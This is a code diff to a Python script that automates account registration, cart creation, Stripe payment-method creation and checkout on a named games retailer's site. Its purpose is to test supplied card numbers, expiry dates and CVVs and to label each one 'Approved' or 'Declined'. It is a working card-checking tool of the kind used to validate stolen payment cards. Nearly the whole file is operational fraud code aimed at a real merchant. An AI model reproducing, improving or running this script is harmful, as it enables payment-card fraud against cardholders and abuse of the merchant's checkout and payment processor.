@@ -1,3 +1,4 @@
+# new.py - Updated version
 import requests
 import random
 import re
@@ -6,7 +7,7 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
     """Main function to process card checkout - returns result as dictionary"""
     try:
         # Create a session
-        r = requests.Session()
+        session = requests.Session()
 
         headers = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
@@ -14,19 +15,20 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
         }
 
         # Get the registration page
-        response = requests.get('https://legacygames.com/my-account/payment-methods/', headers=headers)
+        response = session.get('https://legacygames.com/my-account/payment-methods/', headers=headers)
 
         # Extract nonce with error handling
         match = re.search(r'woocommerce-register-nonce" value="(.*?)"', response.text)
         if match:
             non = match.group(1)
-            #print(f"Nonce found: {non}")
+            print(f"[+] Nonce found: {non}")
         else:
             return {
-                "card_used": f"{card_number[:6]}******{card_number[-4:]}",
+                "success": False,
+                "message": "Could not find registration nonce",
+                "card": f"{card_number[:6]}******{card_number[-4:]}",
                 "email": "",
-                "response": "Error: Could not find registration nonce in response",
-                "status": 500
+                "gateway": "legacygames.com"
             }
 
         # Random user/email
@@ -61,14 +63,15 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
         }
 
         # Send registration request
-        reg = r.post('https://legacygames.com/my-account/', headers=headers, data=data)
+        reg = session.post('https://legacygames.com/my-account/', headers=headers, data=data)
 
         if reg.status_code != 200:
             return {
-                "card_used": f"{card_number[:6]}******{card_number[-4:]}",
+                "success": False,
+                "message": f"Registration failed with status {reg.status_code}",
+                "card": f"{card_number[:6]}******{card_number[-4:]}",
                 "email": email,
-                "response": f"Registration may have failed. Response: {reg.text[:500]}",
-                "status": reg.status_code
+                "gateway": "legacygames.com"
             }
 
         headers = {
@@ -87,24 +90,26 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
         }
 
         # Add item to cart
-        response = r.get(
+        response = session.get(
             'https://legacygames.com?add-to-cart=1924025&quantity=1&e-redirect=https://legacygames.com/cart/?coupon=HCR-011',
             headers=headers,
         )
 
-        # Extract checkout nonce with error handling
+        # Extract checkout nonce
         match = re.search(r'"checkout":"(.*?)"', response.text)
         if match:
             nonce = match.group(1)
+            print(f"[+] Checkout nonce: {nonce}")
         else:
             return {
-                "card_used": f"{card_number[:6]}******{card_number[-4:]}",
+                "success": False,
+                "message": "Could not find checkout nonce",
+                "card": f"{card_number[:6]}******{card_number[-4:]}",
                 "email": email,
-                "response": "Error: Could not find checkout nonce in response",
-                "status": 500
+                "gateway": "legacygames.com"
             }
 
-        # Extract public key with error handling
+        # Extract public key
         match = re.search(r'isUPEEnabled":"1","key":"(.*?)"', response.text)
         if match:
             pk = match.group(1)
@@ -114,11 +119,14 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
                 pk = match.group(1)
             else:
                 return {
-                    "card_used": f"{card_number[:6]}******{card_number[-4:]}",
+                    "success": False,
+                    "message": "Could not find public key",
+                    "card": f"{card_number[:6]}******{card_number[-4:]}",
                     "email": email,
-                    "response": "Error: Could not find public key in response",
-                    "status": 500
+                    "gateway": "legacygames.com"
                 }
+
+        print(f"[+] Public key: {pk[:20]}...")
 
         headers = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
@@ -170,16 +178,18 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
 
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
-        # Extract payment method ID with error handling
+        # Extract payment method ID
         match = re.search(r'"id"\s*:\s*"([^"]+)"', response.text)
         if match:
             payment_id = match.group(1)
+            print(f"[+] Payment ID: {payment_id}")
         else:
             return {
-                "card_used": f"{card_number[:6]}******{card_number[-4:]}",
+                "success": False,
+                "message": f"Could not get payment ID. Stripe response: {response.text[:200]}",
+                "card": f"{card_number[:6]}******{card_number[-4:]}",
                 "email": email,
-                "response": f"Error: Could not find payment method ID in response. Stripe response: {response.text}",
-                "status": 500
+                "gateway": "legacygames.com"
             }
 
         params = {
@@ -226,26 +236,75 @@ def process_card_checkout(card_number, exp_month, exp_year, cvv):
             "wc-stripe-payment-method": payment_id,
         }
 
-        # Make sure to use the session for consistency
-        response = r.post(
+        # Final checkout request
+        response = session.post(
             'https://legacygames.com',
             params=params,
             headers=headers,
             data=data
         )
 
-        # Return the response in the format you wanted
-        return {
-            "card_used": f"{card_number[:6]}******{card_number[-4:]}",
-            "email": email,
-            "response": response.text,
-            "status": response.status_code
-        }
+        # Parse response
+        try:
+            response_json = response.json()
+            result = response_json.get('result', '')
+            message = response_json.get('messages', '')
+            
+            if result == 'success' or 'thank you' in str(response_json).lower():
+                return {
+                    "success": True,
+                    "message": "Approved ✅",
+                    "details": f"Card charged successfully. {message}",
+                    "card": f"{card_number[:6]}******{card_number[-4:]}",
+                    "email": email,
+                    "gateway": "legacygames.com",
+                    "response_code": response.status_code
+                }
+            else:
+                return {
+                    "success": False,
+                    "message": "Declined ❌",
+                    "details": f"Payment failed. Result: {result}. {message}",
+                    "card": f"{card_number[:6]}******{card_number[-4:]}",
+                    "email": email,
+                    "gateway": "legacygames.com",
+                    "response_code": response.status_code
+                }
+        except:
+            # If not JSON, check for success indicators
+            if 'thank you' in response.text.lower() or 'order received' in response.text.lower():
+                return {
+                    "success": True,
+                    "message": "Approved ✅",
+                    "details": "Card charged successfully",
+                    "card": f"{card_number[:6]}******{card_number[-4:]}",
+                    "email": email,
+                    "gateway": "legacygames.com",
+                    "response_code": response.status_code
+                }
+            else:
+                return {
+                    "success": False,
+                    "message": "Declined ❌",
+                    "details": f"Payment failed. Response: {response.text[:200]}",
+                    "card": f"{card_number[:6]}******{card_number[-4:]}",
+                    "email": email,
+                    "gateway": "legacygames.com",
+                    "response_code": response.status_code
+                }
 
     except Exception as e:
         return {
-            "card_used": f"{card_number[:6]}******{card_number[-4:]}",
+            "success": False,
+            "message": f"Error: {str(e)[:100]}",
+            "card": f"{card_number[:6]}******{card_number[-4:]}",
             "email": "",
-            "response": f"Exception occurred: {str(e)}",
-            "status": 500
+            "gateway": "legacygames.com"
         }
+
+
+# Test function if run directly
+if __name__ == "__main__":
+    # Test the function
+    result = process_card_checkout("4111111111111111", "04", "2025", "123")
+    print("Test result:", result)
